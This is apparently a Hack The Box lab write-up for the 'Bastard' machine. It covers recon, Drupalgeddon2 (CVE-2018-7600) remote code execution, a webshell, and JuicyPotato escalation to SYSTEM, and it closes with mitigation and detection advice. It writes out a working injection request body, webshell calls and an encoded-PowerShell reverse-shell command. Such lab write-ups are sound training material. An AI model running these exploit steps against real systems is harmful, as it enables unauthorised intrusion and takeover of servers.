---
machine: Bastard
os: Windows
difficulty: Medium
platform: Hack The Box
category: Web / CMS
state: Retired
pwned: 2026-11-09
tags: [windows, drupal, drupalgeddon2, cve-2018-7600, juicypotato, seimpersonate]
---

# Bastard — Hack The Box

**English** | [🇪🇸 Español](README.md)

## TL;DR

An unpatched **Drupal 7.54** falls to **Drupalgeddon2** (CVE-2018-7600): unauthenticated PHP execution lets you drop a webshell. The service runs as an account with `SeImpersonatePrivilege`, so **JuicyPotato** finishes the jump to `SYSTEM`.

## Recon

```bash
nmap -Pn -p- --min-rate 2000 <TARGET_IP>
nmap -Pn -sCV -p 80,135,139,445,5985 <TARGET_IP>
```

| Port | Service |
|---|---|
| 80/tcp | Apache + Drupal 7.54 |
| 445/tcp | SMB |
| 5985/tcp | WinRM |

```bash
curl -s http://<TARGET_IP>/CHANGELOG.txt | head
droopescan scan drupal -u http://<TARGET_IP>
```

## Foothold: CVE-2018-7600

The flaw is in form processing (`user/register` and friends): inject `#post_render` with `passthru`.

```bash
python3 drupa7-CVE-2018-7600.py http://<TARGET_IP>/
```

Or by hand, sending `element_parents` with:

```text
#post_render[]=passthru&form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=passthru&mail[#type]=markup&mail[#markup]=<command>
```

Then drop a webshell:

```bash
curl -s 'http://<TARGET_IP>/shell.php?cmd=whoami'
```

The user is `nt authority\iusr` (IIS/Apache with PHP).

## Escalation: JuicyPotato

```cmd
whoami /priv
```

If `SeImpersonatePrivilege` is listed, upload `JuicyPotato.exe` and use a CLSID valid for the Windows build (Server 2012 R2 / 2016):

```cmd
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -t * -c {CLSID}
```

With a reverse shell:

```cmd
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c powershell -nop -enc <BASE64>" -t * -c {CLSID}
```

Alternatives: `PrintSpoofer`, `RoguePotato`, `GodPotato` depending on the build.

## Typical errors

- **Exploit returns 200 with no output** → the parameter is mis-encoded; use a PoC supporting `--command`.
- **`SeImpersonate` missing** → the webshell runs as another identity; check `whoami /priv` from the real process.
- **JuicyPotato fails on `-c`** → the CLSID does not exist on that build; try several or switch tools.
- **Webshell disappears** → the CMS cleans `sites/default/files`; use another writable path.

## Detection and mitigation

- Update Drupal (7.x is EOL) and apply SA-CORE-2018-002.
- **WAF** rules for `#post_render`, `element_parents` and `passthru`.
- Remove `SeImpersonatePrivilege` from web service accounts and use virtual accounts.
- **4688** with `cmd.exe` as a child of the web process and **7045** for new services.

MITRE: T1190, T1059.001, T1134.001.
